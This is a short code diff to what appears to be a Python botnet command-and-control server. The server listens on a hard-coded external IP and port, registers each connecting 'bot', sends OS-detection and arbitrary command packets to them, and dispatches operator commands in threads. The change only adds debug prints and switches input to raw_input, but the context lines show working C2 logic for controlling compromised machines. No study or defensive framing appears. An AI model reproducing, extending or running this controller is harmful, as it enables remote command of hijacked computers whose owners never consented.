@@ -28,6 +28,7 @@ def start_server(port=2003,ip="142.93.197.240"):
             print("[*] New bot %s"%(str(addr[0])))
 
 def detect_os():
+    print("in func")
     #Build a dictionary of botnet addresses and sock connections
     for bot in botnet:
         botnet[bot].send("OS".encode())
@@ -60,6 +61,7 @@ def process_cmd(cmd):
         exec_command(cmd)
         print("[*] Command packets sent!")
     if(cmd == "get os"):
+        print("in get os")
         detect_os()
     if 'test' in cmd:
         cmd = cmd.strip("test ")
@@ -71,7 +73,7 @@ def main():
         listener_thread.start()
         sleep(2)
         while True:
-            cmd = input(">>")
+            cmd = raw_input(">>")
             command_thread = Thread(target=process_cmd,args=(cmd,))
             command_thread.start()
             print("[*] Processing command")
